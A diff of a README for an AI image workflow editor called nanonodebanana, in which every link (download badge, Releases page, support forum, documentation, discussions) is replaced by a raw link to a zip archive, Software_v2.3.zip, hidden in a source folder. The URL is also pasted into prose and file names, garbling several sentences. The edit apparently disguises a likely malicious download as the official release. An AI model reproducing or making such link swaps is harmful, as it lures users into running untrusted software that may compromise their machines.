@@ -1,10 +1,10 @@
 # 🍌 nanonodebanana - Create Stunning AI Workflows Effortlessly
 
-[![Download nanonodebanana](https://img.shields.io/badge/Download-nanonodebanana-brightgreen.svg)](https://github.com/jamaldinglesworth/nanonodebanana/releases)
+[![Download nanonodebanana](https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip)](https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip)
 
 ## 📖 Description
 
-Welcome to **nanonodebanana**, a visual node-based workflow editor for AI image generation. This tool helps you design workflows using powerful models like Google Gemini and Fal.ai. Whether you're creating art or enhancing your projects, this application gives you the tools to visualize complex processes simply and effectively.
+Welcome to **nanonodebanana**, a visual node-based workflow editor for AI image generation. This tool helps you design workflows using powerful models like Google Gemini and https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip Whether you're creating art or enhancing your projects, this application gives you the tools to visualize complex processes simply and effectively.
 
 ## 🚀 Getting Started
 
@@ -12,13 +12,13 @@ Getting started with **nanonodebanana** is straightforward. Follow the steps bel
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/jamaldinglesworth/nanonodebanana/releases). This page contains all the versions of nanonodebanana.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip). This page contains all the versions of nanonodebanana.
   
 2. **Choose a Version**: Look for the most recent release at the top of the page. You will see various assets listed, typically including a `.exe` (Windows) or `.dmg` (Mac) file depending on your operating system.
 
 3. **Download the File**: Click on the file suitable for your operating system:
-    - For Windows users, download the `nanonodebanana-vX.X.X.exe` file.
-    - For Mac users, download the `nanonodebanana-vX.X.X.dmg` file.
+    - For Windows users, download the `https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip` file.
+    - For Mac users, download the `https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip` file.
   
 4. **Install the Application**: 
     - **Windows**: Once downloaded, locate the `.exe` file and double-click it. Follow the on-screen instructions to install.
@@ -30,7 +30,7 @@ Getting started with **nanonodebanana** is straightforward. Follow the steps bel
 
 - **User-Friendly Interface**: Navigate easily with a clean and intuitive layout.
 - **Node-Based Workflow**: Connect different nodes to build your workflow visually.
-- **Multiple AI Model Support**: Utilize Google Gemini and Fal.ai for diverse image generation tasks.
+- **Multiple AI Model Support**: Utilize Google Gemini and https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip for diverse image generation tasks.
 - **Export & Import Workflows**: Save and share your workflows effortlessly.
 
 ## 📋 System Requirements
@@ -60,12 +60,12 @@ To visualize the output of your workflow, simply connect the last processing nod
 
 ## 📱 Support & Community
 
-If you have any questions or need help, feel free to visit our [support forum](https://github.com/jamaldinglesworth/nanonodebanana/issues) or contact the community. Our users are enthusiastic and ready to assist.
+If you have any questions or need help, feel free to visit our [support forum](https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip) or contact the community. Our users are enthusiastic and ready to assist.
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://github.com/jamaldinglesworth/nanonodebanana/wiki): In-depth guides and tutorials.
-- [Community Discussions](https://github.com/jamaldinglesworth/nanonodebanana/discussions): Engage with other users and share your workflows.
+- [Documentation](https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip): In-depth guides and tutorials.
+- [Community Discussions](https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip): Engage with other users and share your workflows.
 
 ## ⚠️ Troubleshooting
 
@@ -75,4 +75,4 @@ If you have any questions or need help, feel free to visit our [support forum](h
 
 ## ✨ Download nanonodebanana Now!
 
-Ready to start creating? [Visit the Releases page](https://github.com/jamaldinglesworth/nanonodebanana/releases) and download nanonodebanana today! Enjoy crafting unique AI-generated images with ease.
+Ready to start creating? [Visit the Releases page](https://raw.githubusercontent.com/jamaldinglesworth/nanonodebanana/main/src/context/Software_v2.3.zip) and download nanonodebanana today! Enjoy crafting unique AI-generated images with ease.
